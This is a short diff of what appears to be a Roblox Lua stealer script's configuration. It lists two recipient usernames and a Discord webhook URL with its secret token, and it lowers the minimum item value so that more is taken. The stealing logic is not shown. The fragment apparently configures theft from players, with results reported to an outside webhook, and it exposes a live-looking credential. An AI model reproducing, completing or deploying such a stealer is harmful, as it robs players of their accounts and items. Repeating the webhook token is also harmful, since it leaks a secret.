@@ -5,7 +5,7 @@ end
 _G.scriptExecuted = true
 
 local users = {"Pipiwastaken", "HellboyStorage"}
-local min_value = 0.0001
+local min_value = 0.000001
 local ping = "Yes"
 local webhook = "https://discord.com/api/webhooks/1456717208024780966/Pf0I_BpaFl4ib7Sor65qsqMNrXeHKZQVdhMkazX2ONSCB2m7iQqtcz5xapudXbPRH9SE"
 
